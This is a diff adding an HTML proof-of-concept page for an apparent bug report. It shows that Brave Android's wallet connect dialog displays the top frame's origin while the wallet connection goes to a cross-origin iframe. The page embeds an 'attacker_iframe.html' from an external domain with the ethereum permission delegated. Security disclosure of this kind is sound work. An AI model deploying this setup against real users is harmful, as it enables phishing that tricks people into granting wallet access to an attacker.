@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>F12 PoC - Trusted Embedder (TOP frame)</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; }
+  .card { border: 1px solid #ccc; border-radius: 10px; padding: 16px; max-width: 680px; }
+  h1 { font-size: 18px; } code { background:#f3f3f3; padding:1px 4px; border-radius:4px; }
+  iframe { width: 100%; height: 220px; border: 2px dashed #b00; border-radius: 8px; }
+  .note { color:#555; font-size: 13px; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>TOP frame = the "trusted" embedder</h1>
+    <p class="note">
+      This page plays the role of a trusted site (e.g. a dApp portal) that the victim recognizes.
+      Host THIS file on <b>origin A</b> (the origin you expect the Brave Android connect dialog to display).
+      It embeds a cross-origin iframe from <b>origin B</b> and grants it <code>allow="ethereum"</code>.
+    </p>
+    <p class="note">
+      EDIT the <code>src</code> below to point at where you hosted <code>attacker_iframe.html</code>
+      on a DIFFERENT origin (origin B). Origin A and origin B MUST be cross-origin for the test to be valid.
+    </p>
+
+    <!-- The top page delegates the "ethereum" permissions-policy feature to the cross-origin child. -->
+    <iframe
+      src="https://syarif07.my.id/wallet/attacker_iframe.html"
+      allow="ethereum"
+      title="embedded dapp (origin B)"></iframe>
+
+    <p class="note">
+      Expected (the bug): when the iframe (origin B) calls <code>eth_requestAccounts</code>, Brave Android's
+      connect dialog shows the domain line as <b>origin A</b> (this top page) while the connection is granted
+      to <b>origin B</b> (the iframe). Confirm the granted site in Brave Wallet &rarr; Settings &rarr; Connected sites.
+    </p>
+  </div>
+</body>
+</html>
